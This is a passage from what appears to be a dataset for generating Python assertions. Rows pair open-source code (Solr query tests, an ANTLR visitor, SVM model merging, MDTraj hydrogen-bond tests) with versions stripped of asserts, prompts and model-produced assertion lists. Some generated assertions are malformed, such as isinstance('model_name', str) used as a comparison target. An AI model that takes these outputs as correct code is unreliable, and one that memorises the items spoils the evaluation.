92        )","[['query_dict', '==', 'expected_query_dict'], ['get_terms_set_in_filter_query(', '==', 'True']]",2,2,1.0,0.00062893081761,"['logger', 'TESTS_IDS', 'solr_fq', 'term', 'solr_fqs', 'query_dict']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['logger', 'TESTS_IDS', 'solr_fq', 'term', 'solr_fqs', 'query_dict']
*Code:

1import pytest
2import logging
3from opencontext_py.apps.searcher.new_solrsearcher import configs
4from opencontext_py.apps.searcher.new_solrsearcher.querymaker import (
5    get_identifier_query_dict,
6    get_object_uri_query_dict,
7)
8
9logger = logging.getLogger(""tests-unit-logger"")
10
11
12TESTS_IDS = [
13    # Tuples of test cases, with input raw_identifiers and expected
14    # output query_dict:
15    #
16    # (raw_identifier, expected_query_dict),
17    #
18    (None, None,),
19    (
20        'ark:/28722/k2g44m01s',
21        {
22            'fq': [
23                ""((persistent_uri:ark\\:/28722/k2g44m01s) ""
24                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/k2g44m01s) ""
25                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/k2g44m01s))"",
26            ],
27        }
28    ),
29    (
30        'ark:/28722/foo||ark:/28722/bar',
31        {
32            'fq': [
33                ""((persistent_uri:ark\\:/28722/foo) "" 
34                + ""OR (persistent_uri:ark\\:/28722/bar) "" 
35                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/foo) ""
36                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/bar) ""
37                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/foo) ""
38                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/bar))"",
39            ],
40        }
41    ),
42    (
43        'slug-foo',
44        {
45            'fq': [
46                ""((persistent_uri:slug\\-foo) "" 
47                + ""OR (uuid:slug-foo) "" 
48                + ""OR (slug_type_uri_label:slug_foo___*) "" 
49                + ""OR (persistent_uri:http\\://orcid.org/slug\\-foo) ""
50                + ""OR (persistent_uri:https\\://orcid.org/slug\\-foo) ""
51                + ""OR (persistent_uri:http\\://doi.org/slug\\-foo) ""
52                + ""OR (persistent_uri:https\\://doi.org/slug\\-foo) ""
53                + ""OR (persistent_uri:http\\://dx.doi.org/slug\\-foo) ""
54                + ""OR (persistent_uri:https\\://dx.doi.org/slug\\-foo))"",
55            ],
56        }
57    ),
58    (
59        'http://opencontext.org/persons/foo',
60        {
61            'fq': [
62                ""((uuid:foo) ""
63                + ""OR (persistent_uri:http\\://opencontext.org/persons/foo) ""
64                + ""OR (persistent_uri:https\\://opencontext.org/persons/foo) "" 
65                + ""OR (persistent_uri:http\\://opencontext.org/persons/foo/) ""
66                + ""OR (persistent_uri:https\\://opencontext.org/persons/foo/))"",
67            ],
68        }
69    ),
70]
71
72
73def get_terms_set_in_filter_query(solr_fq, term="" OR ""):
74    """"""Splits a solr filter query on a term""""""
75    solr_fqs = solr_fq.replace(
76        '(', ''
77    ).replace(
78        ')', ''
79    ).split(term)
80    return set(solr_fqs)
81     
82
83def test_get_identifier_query_dict():
84    """"""Tests making a query dict for document identifiers.""""""
85    for raw_identifier, expected_query_dict in TESTS_IDS:
86        query_dict = get_identifier_query_dict(raw_identifier)
87        if query_dict is None:
88            continue
89            query_dict['fq'][0]
90        ) == get_terms_set_in_filter_query(
91             expected_query_dict['fq'][0]
92        )",4705,"[[73, 'solr_fq', '!=', None, 'solr_fq cannot be None for the split operation to occur'],
 [73, 'term', '!=', None, 'term cannot be None for the split operation to occur'],
 [85, 'TESTS_IDS', '!=', None, 'TESTS_IDS cannot be None for the for loop to proceed'],
 [87, 'query_dict', '!=', None, 'query_dict cannot be None for the dictionary indexing to occur'],
 [91, 'expected_query_dict', '!=', None, 'expected_query_dict cannot be None for the dictionary indexing to occur']]"
SDX2000/boo,"import sys
import antlr
      

class Visitor(antlr.ASTVisitor):
   def __init__(self,*args):
      super(Visitor,self).__init__(*args)
      self.level = 0
      if not args:
         self.cout = sys.stdout
         return
      if isinstance(args[0],file):
         self.cout = args[0]
         return
      assert 0

   def tabs(self):
      print "" "" * self.level

   def printf(self,fmt,*args):
      if not args:
          sys.stdout.write(fmt)
          return
      argv = tuple(args)
      self.cout.write(fmt % argv)

   def flush(self):
      self.cout.flush()

   def visit1(self,node):
      if not node:
         self.printf("" nil "")
         return

      c = node.getType()
      t = node.getText()
      k = node.getFirstChild()
      s = node.getNextSibling()
    
      self.printf(""( <%s> "",c)
      if t:
         self.printf("" %s "",t)
      self.visit1(k);
      self.visit1(s);
      self.printf("")"")

   def visit(self,node):
      self.visit1(node);
      self.printf(""\n"")
      

stream = None

def setstream(st):
   import keepws
   keepws.stream = st

def getstream():
   assert stream
   return stream

### referenced by treewalker
def write(*args):
   import sys
   sys.stdout.write(*args)
   sys.stdout.flush()

### walk list of hidden tokens in order, printing them out
def dumpHidden(t):
   assert stream
   while t:
      write(t.getText())
      t = stream.getHiddenAfter(t)

def pr(p):
   write(p.getText())
   dumpHidden(p.getHiddenAfter())


def main():
   import keepws_l
   import keepws_p
   import keepws_w
   
   L = keepws_l.Lexer() 

   ### change token class
   L.setTokenObjectClass(antlr.CommonHiddenStreamToken)

   ### create new token stream - referenced by parser
   ### global stream
   st = antlr.TokenStreamHiddenTokenFilter(L);
   st.hide(keepws_p.WS);
   st.hide(keepws_p.SL_COMMENT);
   setstream(st)
   ### create parser with my stream
   P = keepws_p.Parser(st)
   P.setFilename(L.getFilename())

   ### use this kind of AST nodes
   P.setASTNodeClass(antlr.CommonASTWithHiddenTokens)

   ### Parse the input expression
   try:
      P.slist()
   except antlr.ANTLRException, ex:
      print ""*** error(s) while parsing.""
      print "">>> exit(1)""
      import sys
      sys.exit(1)

   
   ast = P.getAST()
   
   if not ast:
      print ""stop - no AST generated.""
      import sys
      sys.exit(1)
      
   ###show tree
   print ""Tree: "" + ast.toStringTree()
   print ""List: "" + ast.toStringList()
   print ""Node: "" + ast.toString()
   print ""visit>>""
   visitor = Visitor()
   visitor.visit(ast);
   print ""visit<<""

   W = keepws_w.Walker()
   W.slist(ast)
   print ""Ast tree walked without problems.""

if __name__ == ""__main__"":
   main()
","
1import sys
2import antlr
3      
4
5class Visitor(antlr.ASTVisitor):
6   def __init__(self,*args):
7      super(Visitor,self).__init__(*args)
8      self.level = 0
9      if not args:
10         self.cout = sys.stdout
11         return
12      if isinstance(args[0],file):
13         self.cout = args[0]
14         return
15
16   def tabs(self):
17      print "" "" * self.level
18
19   def printf(self,fmt,*args):
20      if not args:
21          sys.stdout.write(fmt)
22          return
23      argv = tuple(args)
24      self.cout.write(fmt % argv)
25
26   def flush(self):
27      self.cout.flush()
28
29   def visit1(self,node):
30      if not node:
31         self.printf("" nil "")
32         return
33
34      c = node.getType()
35      t = node.getText()
36      k = node.getFirstChild()
37      s = node.getNextSibling()
38    
39      self.printf(""( <%s> "",c)
40      if t:
41         self.printf("" %s "",t)
42      self.visit1(k);
43      self.visit1(s);
44      self.printf("")"")
45
46   def visit(self,node):
47      self.visit1(node);
48      self.printf(""\n"")
49      
50
51stream = None
52
53def setstream(st):
54   import keepws
55   keepws.stream = st
56
57def getstream():
58   return stream
59
60### referenced by treewalker
61def write(*args):
62   import sys
63   sys.stdout.write(*args)
64   sys.stdout.flush()
65
66### walk list of hidden tokens in order, printing them out
67def dumpHidden(t):
68   while t:
69      write(t.getText())
70      t = stream.getHiddenAfter(t)
71
72def pr(p):
73   write(p.getText())
74   dumpHidden(p.getHiddenAfter())
75
76
77def main():
78   import keepws_l
79   import keepws_p
80   import keepws_w
81   
82   L = keepws_l.Lexer() 
83
84   ### change token class
85   L.setTokenObjectClass(antlr.CommonHiddenStreamToken)
86
87   ### create new token stream - referenced by parser
88   ### global stream
89   st = antlr.TokenStreamHiddenTokenFilter(L);
90   st.hide(keepws_p.WS);
91   st.hide(keepws_p.SL_COMMENT);
92   setstream(st)
93   ### create parser with my stream
94   P = keepws_p.Parser(st)
95   P.setFilename(L.getFilename())
96
97   ### use this kind of AST nodes
98   P.setASTNodeClass(antlr.CommonASTWithHiddenTokens)
99
100   ### Parse the input expression
101   try:
102      P.slist()
103   except antlr.ANTLRException, ex:
104      print ""*** error(s) while parsing.""
105      print "">>> exit(1)""
106      import sys
107      sys.exit(1)
108
109   
110   ast = P.getAST()
111   
112   if not ast:
113      print ""stop - no AST generated.""
114      import sys
115      sys.exit(1)
116      
117   ###show tree
118   print ""Tree: "" + ast.toStringTree()
119   print ""List: "" + ast.toStringList()
120   print ""Node: "" + ast.toString()
121   print ""visit>>""
122   visitor = Visitor()
123   visitor.visit(ast);
124   print ""visit<<""
125
126   W = keepws_w.Walker()
127   W.slist(ast)
128   print ""Ast tree walked without problems.""
129
130if __name__ == ""__main__"":
131   main()
132","[['0', '==', 'True'], ['stream', '==', 'True'], ['stream', '==', 'True']]",3,3,1.0,0.0011082379017362,"['*args', 'self.level', 'self.cout', 'fmt', 'argv', 'node', 'c', 't', 'k', 's', 'stream', 'st', 'keepws.stream', 'p', 'L', 'P', 'ast', 'visitor', 'W']",19,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['*args', 'self.level', 'self.cout', 'fmt', 'argv', 'node', 'c', 't', 'k', 's', 'stream', 'st', 'keepws.stream', 'p', 'L', 'P', 'ast', 'visitor', 'W']
*Code:

1import sys
2import antlr
3      
4
5class Visitor(antlr.ASTVisitor):
6   def __init__(self,*args):
7      super(Visitor,self).__init__(*args)
8      self.level = 0
9      if not args:
10         self.cout = sys.stdout
11         return
12      if isinstance(args[0],file):
13         self.cout = args[0]
14         return
15
16   def tabs(self):
17      print "" "" * self.level
18
19   def printf(self,fmt,*args):
20      if not args:
21          sys.stdout.write(fmt)
22          return
23      argv = tuple(args)
24      self.cout.write(fmt % argv)
25
26   def flush(self):
27      self.cout.flush()
28
29   def visit1(self,node):
30      if not node:
31         self.printf("" nil "")
32         return
33
34      c = node.getType()
35      t = node.getText()
36      k = node.getFirstChild()
37      s = node.getNextSibling()
38    
39      self.printf(""( <%s> "",c)
40      if t:
41         self.printf("" %s "",t)
42      self.visit1(k);
43      self.visit1(s);
44      self.printf("")"")
45
46   def visit(self,node):
47      self.visit1(node);
48      self.printf(""\n"")
49      
50
51stream = None
52
53def setstream(st):
54   import keepws
55   keepws.stream = st
56
57def getstream():
58   return stream
59
60### referenced by treewalker
61def write(*args):
62   import sys
63   sys.stdout.write(*args)
64   sys.stdout.flush()
65
66### walk list of hidden tokens in order, printing them out
67def dumpHidden(t):
68   while t:
69      write(t.getText())
70      t = stream.getHiddenAfter(t)
71
72def pr(p):
73   write(p.getText())
74   dumpHidden(p.getHiddenAfter())
75
76
77def main():
78   import keepws_l
79   import keepws_p
80   import keepws_w
81   
82   L = keepws_l.Lexer() 
83
84   ### change token class
85   L.setTokenObjectClass(antlr.CommonHiddenStreamToken)
86
87   ### create new token stream - referenced by parser
88   ### global stream
89   st = antlr.TokenStreamHiddenTokenFilter(L);
90   st.hide(keepws_p.WS);
91   st.hide(keepws_p.SL_COMMENT);
92   setstream(st)
93   ### create parser with my stream
94   P = keepws_p.Parser(st)
95   P.setFilename(L.getFilename())
96
97   ### use this kind of AST nodes
98   P.setASTNodeClass(antlr.CommonASTWithHiddenTokens)
99
100   ### Parse the input expression
101   try:
102      P.slist()
103   except antlr.ANTLRException, ex:
104      print ""*** error(s) while parsing.""
105      print "">>> exit(1)""
106      import sys
107      sys.exit(1)
108
109   
110   ast = P.getAST()
111   
112   if not ast:
113      print ""stop - no AST generated.""
114      import sys
115      sys.exit(1)
116      
117   ###show tree
118   print ""Tree: "" + ast.toStringTree()
119   print ""List: "" + ast.toStringList()
120   print ""Node: "" + ast.toString()
121   print ""visit>>""
122   visitor = Visitor()
123   visitor.visit(ast);
124   print ""visit<<""
125
126   W = keepws_w.Walker()
127   W.slist(ast)
128   print ""Ast tree walked without problems.""
129
130if __name__ == ""__main__"":
131   main()
132",4477,"[[6, '*args', '!=', None, ""The constructor requires at least one argument""], 
 [16, 'self.level', '>=', 0, ""Level should not be negative""],
 [19, '*args', '!=', None, ""printf function requires at least one argument""],
 [27, 'self.cout', '!=', None, ""cout should not be None before flushing""],
 [29, 'node', '!=', None, ""visit1 function requires an argument""],
 [46, 'node', '!=', None, ""visit function requires a node argument""],
 [53, 'st', '!=', None, ""setstream function requires a stream argument""],
 [61, '*args', '!=', None, ""write function requires at least one argument""],
 [67, 't', '!=', None, ""dumpHidden function requires a token""],
 [72, 'p', '!=', None, ""pr function requires a property""],
 [82, 'L', '!=', None, ""Lexer must be instantiated""],
 [89, 'st', '!=', None, ""TokenStreamHiddenTokenFilter requires a Lexer""],
 [94, 'P', '!=', None, ""Parser must be instantiated""],
 [102, 'P', '!=', None, ""Parser must be available for parsing""],
 [110, 'ast', '!=', None, ""ast must be generated by Parser""],
 [122, 'visitor', '!=', None, ""Visitor must be instantiated to visit""],
 [126, 'W', '!=', None, ""Walker must be instantiated""],
 [110, 'ast', '!=', None, ""AST should not be None""],
 [122, 'ast', '!=', None, ""AST should not be None""]]"
li-xirong/image2label,"
import sys
import os
import time

from basic.constant import ROOT_PATH
from basic.common import checkToSkip,makedirsforfile, printStatus


INFO = __file__

def process(options, model_name, concept_file, weight_dir, result_dir):
    rootpath = options.rootpath
    overwrite = options.overwrite

    if 'fastlinear' == model_name:
        from fastlinear.fastlinear import fastlinear_load_model as load_model
        from fastlinear.fastlinear import fastlinear_save_model as save_model
    else:
        from fiksvm.fiksvm import fiksvm_load_model as load_model
        from fiksvm.fiksvm import fiksvm_save_model as save_model


    concepts = [x.strip() for x in open(concept_file).readlines() if x.strip() and not x.strip().startswith('#')]
    todo = [x for x in concepts if overwrite or not os.path.exists(os.path.join(result_dir, '%s.model'%x))]
    printStatus(INFO, '%d concepts to do' % len(todo))

    for concept in todo:
        weight_file = os.path.join(weight_dir, '%s.txt' % concept)
        weight_data = map(str.strip, open(weight_file).readlines())
        nr_of_models = len(weight_data)
        assert(nr_of_models >= 2)
        weights = [0] * nr_of_models
        models = [None] * nr_of_models

        for i,line in enumerate(weight_data):
            w, model_dir = line.split()
            weights[i] = float(w)
            model_dir =  model_dir if model_dir.startswith(rootpath) else os.path.join(rootpath, model_dir)
            assert (model_dir.find(model_name)>0)
            model_file_name = os.path.join(model_dir, '%s.model' % concept)
            models[i] = load_model(model_file_name)

        new_model = models[0]
        new_model.add_fastsvm(models[1], weights[0], weights[1])
        for i in range(2, len(models)):
            new_model.add_fastsvm(models[i], 1, weights[i])    

        new_model_file = os.path.join(result_dir, '%s.model'%concept)
        makedirsforfile(new_model_file)
        save_model(new_model_file, new_model)



def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]

    from optparse import OptionParser
    parser = OptionParser(usage=""""""usage: %prog [options] model_name, concept_file weight_dir result_dir"""""")
    parser.add_option(""--overwrite"", default=0, type=""int"", help=""overwrite existing file (default=0)"")
    parser.add_option(""--rootpath"", default=ROOT_PATH, type=""string"", help=""rootpath (default: %s)"" % ROOT_PATH)
    
    
    (options, args) = parser.parse_args(argv)
    if len(args) < 4:
        parser.print_help()
        return 1
    
    return process(options, args[0], args[1], args[2], args[3])


if __name__ == ""__main__"":
    sys.exit(main())
    
        
","
1
2import sys
3import os
4import time
5
6from basic.constant import ROOT_PATH
7from basic.common import checkToSkip,makedirsforfile, printStatus
8
9
10INFO = __file__
11
12def process(options, model_name, concept_file, weight_dir, result_dir):
13    rootpath = options.rootpath
14    overwrite = options.overwrite
15
16    if 'fastlinear' == model_name:
17        from fastlinear.fastlinear import fastlinear_load_model as load_model
18        from fastlinear.fastlinear import fastlinear_save_model as save_model
19    else:
20        from fiksvm.fiksvm import fiksvm_load_model as load_model
21        from fiksvm.fiksvm import fiksvm_save_model as save_model
22
23
24    concepts = [x.strip() for x in open(concept_file).readlines() if x.strip() and not x.strip().startswith('#')]
25    todo = [x for x in concepts if overwrite or not os.path.exists(os.path.join(result_dir, '%s.model'%x))]
26    printStatus(INFO, '%d concepts to do' % len(todo))
27
28    for concept in todo:
29        weight_file = os.path.join(weight_dir, '%s.txt' % concept)
30        weight_data = map(str.strip, open(weight_file).readlines())
31        nr_of_models = len(weight_data)
32        weights = [0] * nr_of_models
33        models = [None] * nr_of_models
34
35        for i,line in enumerate(weight_data):
36            w, model_dir = line.split()
37            weights[i] = float(w)
38            model_dir =  model_dir if model_dir.startswith(rootpath) else os.path.join(rootpath, model_dir)
39            model_file_name = os.path.join(model_dir, '%s.model' % concept)
40            models[i] = load_model(model_file_name)
41
42        new_model = models[0]
43        new_model.add_fastsvm(models[1], weights[0], weights[1])
44        for i in range(2, len(models)):
45            new_model.add_fastsvm(models[i], 1, weights[i])    
46
47        new_model_file = os.path.join(result_dir, '%s.model'%concept)
48        makedirsforfile(new_model_file)
49        save_model(new_model_file, new_model)
50
51
52
53def main(argv=None):
54    if argv is None:
55        argv = sys.argv[1:]
56
57    from optparse import OptionParser
58    parser = OptionParser(usage=""""""usage: %prog [options] model_name, concept_file weight_dir result_dir"""""")
59    parser.add_option(""--overwrite"", default=0, type=""int"", help=""overwrite existing file (default=0)"")
60    parser.add_option(""--rootpath"", default=ROOT_PATH, type=""string"", help=""rootpath (default: %s)"" % ROOT_PATH)
61    
62    
63    (options, args) = parser.parse_args(argv)
64    if len(args) < 4:
65        parser.print_help()
66        return 1
67    
68    return process(options, args[0], args[1], args[2], args[3])
69
70
71if __name__ == ""__main__"":
72    sys.exit(main())
73    
74        
75","[['(model_dir.find(model_name)>0)', '==', 'True']]",2,1,0.5,0.000373552484124,"['INFO', 'options', 'model_name', 'concept_file', 'weight_dir', 'result_dir', 'rootpath', 'overwrite', 'concepts', 'todo', 'weight_file', 'weight_data', 'nr_of_models', 'weights', 'models', 'w', 'model_dir', 'weights[i]', 'model_file_name', 'models[i]', 'new_model', 'new_model_file', 'argv', 'parser', '(options', 'args)']",26,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['INFO', 'options', 'model_name', 'concept_file', 'weight_dir', 'result_dir', 'rootpath', 'overwrite', 'concepts', 'todo', 'weight_file', 'weight_data', 'nr_of_models', 'weights', 'models', 'w', 'model_dir', 'weights[i]', 'model_file_name', 'models[i]', 'new_model', 'new_model_file', 'argv', 'parser', '(options', 'args)']
*Code:

1
2import sys
3import os
4import time
5
6from basic.constant import ROOT_PATH
7from basic.common import checkToSkip,makedirsforfile, printStatus
8
9
10INFO = __file__
11
12def process(options, model_name, concept_file, weight_dir, result_dir):
13    rootpath = options.rootpath
14    overwrite = options.overwrite
15
16    if 'fastlinear' == model_name:
17        from fastlinear.fastlinear import fastlinear_load_model as load_model
18        from fastlinear.fastlinear import fastlinear_save_model as save_model
19    else:
20        from fiksvm.fiksvm import fiksvm_load_model as load_model
21        from fiksvm.fiksvm import fiksvm_save_model as save_model
22
23
24    concepts = [x.strip() for x in open(concept_file).readlines() if x.strip() and not x.strip().startswith('#')]
25    todo = [x for x in concepts if overwrite or not os.path.exists(os.path.join(result_dir, '%s.model'%x))]
26    printStatus(INFO, '%d concepts to do' % len(todo))
27
28    for concept in todo:
29        weight_file = os.path.join(weight_dir, '%s.txt' % concept)
30        weight_data = map(str.strip, open(weight_file).readlines())
31        nr_of_models = len(weight_data)
32        weights = [0] * nr_of_models
33        models = [None] * nr_of_models
34
35        for i,line in enumerate(weight_data):
36            w, model_dir = line.split()
37            weights[i] = float(w)
38            model_dir =  model_dir if model_dir.startswith(rootpath) else os.path.join(rootpath, model_dir)
39            model_file_name = os.path.join(model_dir, '%s.model' % concept)
40            models[i] = load_model(model_file_name)
41
42        new_model = models[0]
43        new_model.add_fastsvm(models[1], weights[0], weights[1])
44        for i in range(2, len(models)):
45            new_model.add_fastsvm(models[i], 1, weights[i])    
46
47        new_model_file = os.path.join(result_dir, '%s.model'%concept)
48        makedirsforfile(new_model_file)
49        save_model(new_model_file, new_model)
50
51
52
53def main(argv=None):
54    if argv is None:
55        argv = sys.argv[1:]
56
57    from optparse import OptionParser
58    parser = OptionParser(usage=""""""usage: %prog [options] model_name, concept_file weight_dir result_dir"""""")
59    parser.add_option(""--overwrite"", default=0, type=""int"", help=""overwrite existing file (default=0)"")
60    parser.add_option(""--rootpath"", default=ROOT_PATH, type=""string"", help=""rootpath (default: %s)"" % ROOT_PATH)
61    
62    
63    (options, args) = parser.parse_args(argv)
64    if len(args) < 4:
65        parser.print_help()
66        return 1
67    
68    return process(options, args[0], args[1], args[2], args[3])
69
70
71if __name__ == ""__main__"":
72    sys.exit(main())
73    
74        
75",4438,"[[12, 'options', '!=', None, 'options variable should not be None'],
[12, 'model_name', '!=', None, 'model_name variable should not be None'],
[12, 'model_name', '==', isinstance('model_name', str), 'model_name should be of string type'],
[12, 'concept_file', '!=', None, 'concept_file variable should not be None'],
[12, 'weight_dir', '!=', None, 'weight_dir variable should not be None'],
[12, 'result_dir', '!=', None, 'result_dir variable should not be None'],
[16, 'model_name', '==', 'fastlinear' or 'fiksvm', 'model_name should either be fastlinear or fiksvm'],
[24, 'concepts', '==', isinstance('concepts', list), 'concepts should be a list'],
[26, 'len(todo)', '>=', 0, 'The length of todo list should be positive'],
[34, 'weights', '==', isinstance('weights', list), 'weights should be a list'],
[35, 'model_file_name', '!=', None, 'model_file_name variable should not be None'],
[42, 'new_model', '!=', None, 'new_model variable should not be None'],
[64, 'len(args)', '>=', 4, 'The args list should have at least 4 arguments']]"
mpharrigan/mdtraj,"##############################################################################
# MDTraj: A Python Library for Loading, Saving, and Manipulating
#         Molecular Dynamics Trajectories.
# Copyright 2012-2013 Stanford University and the Authors
#
# Authors: Robert McGibbon
# Contributors:
#
# MDTraj is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as
# published by the Free Software Foundation, either version 2.1
# of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with MDTraj. If not, see <http://www.gnu.org/licenses/>.
##############################################################################


import os
import shutil
import tempfile
import subprocess
from distutils.spawn import find_executable

import mdtraj as md
from mdtraj.testing import get_fn, eq, skipif

import numpy as np
import scipy.sparse

###############################################################################
# Globals
###############################################################################

HAVE_DSSP = find_executable('mkdssp')
tmpdir = None

def setup():
    global tmpdir
    tmpdir = tempfile.mkdtemp()

def teardown():
    shutil.rmtree(tmpdir)

def test_hbonds():
    t = md.load(get_fn('2EQQ.pdb'))
    ours = md.geometry.hbond.kabsch_sander(t)

@skipif(not HAVE_DSSP, ""This tests required mkdssp to be installed, from http://swift.cmbi.ru.nl/gv/dssp/"")
def test_hbonds_against_dssp():
    t = md.load(get_fn('2EQQ.pdb'))[0]
    pdb = os.path.join(tmpdir, 'f.pdb')
    dssp = os.path.join(tmpdir, 'f.pdb.dssp')
    t.save(pdb)

    cmd = ['mkdssp', '-i', pdb, '-o', dssp]
    subprocess.check_output(' '.join(cmd), shell=True)
    energy = scipy.sparse.lil_matrix((t.n_residues, t.n_residues))

    # read the dssp N-H-->O column from the output file
    with open(dssp) as f:
        # skip the lines until the description of each residue's hbonds
        while not f.readline().startswith('  #  RESIDUE AA STRUCTURE'):
            continue

        for i, line in enumerate(f):
            line = line.rstrip()
            offset0, e0 = map(float, line[39:50].split(','))
            offset1, e1 = map(float, line[61:72].split(','))
            if e0 <= -0.5:
                energy[int(i+offset0), i] = e0
            if e1 <= -0.5:
                energy[int(i+offset1), i] = e1

    dssp = energy.todense()
    ours = md.geometry.hbond.kabsch_sander(t)[0].todense()

    # There is tricky issues with the rounding right at the -0.5 cutoff,
    # so lets just check for equality with DSSP at -0.6 or less
    eq((dssp < -0.6), (ours < -0.6))
    eq(dssp[dssp < -0.6], ours[ours < -0.6], decimal=1)


def test_baker_hubbard_0():
     t = md.load(get_fn('2EQQ.pdb'))

     # print('to view the hbonds defined in 2EQQ by baker_hubbard()')
     # print('put these commands into pymol on top of the pdb:\n')
     # for e in md.geometry.hbond.baker_hubbard(t):
     #     print('distance RANK %d, RANK %d' % (e[1], e[2]))

     # these are the results produced by the algorithm on this protein as
     # of 11/26/13. This unit test basically just ensures that the method
     # runs and produces the same results it did then. It's no guarentee that
     # these are the ""TRUE"" hydrogen bonds in this system.
     ref =  np.array([[0, 10, 8], [0, 11, 7], [69, 73, 54], [76, 82, 65],
                      [119, 131, 89], [140, 148, 265], [166, 177, 122],
                      [181, 188, 231], [209, 217, 215], [221, 225, 184],
                      [228, 239, 186], [235, 247, 216], [262, 271, 143],
                      [298, 305, 115], [186, 191, 215], [413, 419, 392]])
     eq(ref, md.geometry.hbond.baker_hubbard(t))

def test_baker_hubbard_1():
    # no hydrogens in this file -> no hydrogen bonds
    t = md.load(get_fn('1bpi.pdb'))
    eq(np.zeros((0, 3), dtype=int), md.baker_hubbard(t))

def test_baker_hubbard_2():
    t = md.load(get_fn('1vii_sustiva_water.pdb'))
    triplets = md.baker_hubbard(t)
    N = 1000
    rows = triplets[:, 0] * N*N + triplets[:, 1] * N + triplets[:, 2]
    # ensure that there aren't any repeat rows
    eq(len(np.unique(rows)), len(rows))


def test_wernet_nilsson_0():
    # no hydrogens in this file -> no hydrogen bonds
    t0 = md.load(get_fn('1bpi.pdb'))
    assert len(md.wernet_nilsson(t0)) == len(t0)
    eq(np.zeros((0, 3), dtype=int), md.wernet_nilsson(t0)[0])


def test_wernet_nilsson_1():
    # one of these files has PBCs and the other doesnt
    for fn in ['2EQQ.pdb', '4ZUO.pdb']:
        t = md.load(get_fn(fn))

        result = md.wernet_nilsson(t)
        assert len(result) == len(t)
        assert isinstance(result, list)
        assert all(isinstance(elem, np.ndarray) for elem in result)
        assert all(elem.shape[1] == 3 for elem in result)
        for frame, hbonds in enumerate(result):
            for d_i, h_i, a_i in hbonds:
                assert t.topology.atom(d_i).element.symbol in ['O', 'N']
                assert t.topology.atom(h_i).element.symbol == 'H'
                assert t.topology.atom(a_i).element.symbol in ['O', 'N']
            # assert that the donor-acceptor distance is less than 0.5 nm, just
            # to make sure the criterion is giving back totally implausible stuff
            if len(hbonds) > 0:
                assert np.all(md.compute_distances(t[frame], hbonds[:, [0,2]]) < 0.5)
","
1##############################################################################
2# MDTraj: A Python Library for Loading, Saving, and Manipulating
3#         Molecular Dynamics Trajectories.
4# Copyright 2012-2013 Stanford University and the Authors
5#
6# Authors: Robert McGibbon
7# Contributors:
8#
9# MDTraj is free software: you can redistribute it and/or modify
10# it under the terms of the GNU Lesser General Public License as
11# published by the Free Software Foundation, either version 2.1
12# of the License, or (at your option) any later version.
13#
14# This library is distributed in the hope that it will be useful,
15# but WITHOUT ANY WARRANTY; without even the implied warranty of
16# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
17# GNU Lesser General Public License for more details.
18#
19# You should have received a copy of the GNU Lesser General Public
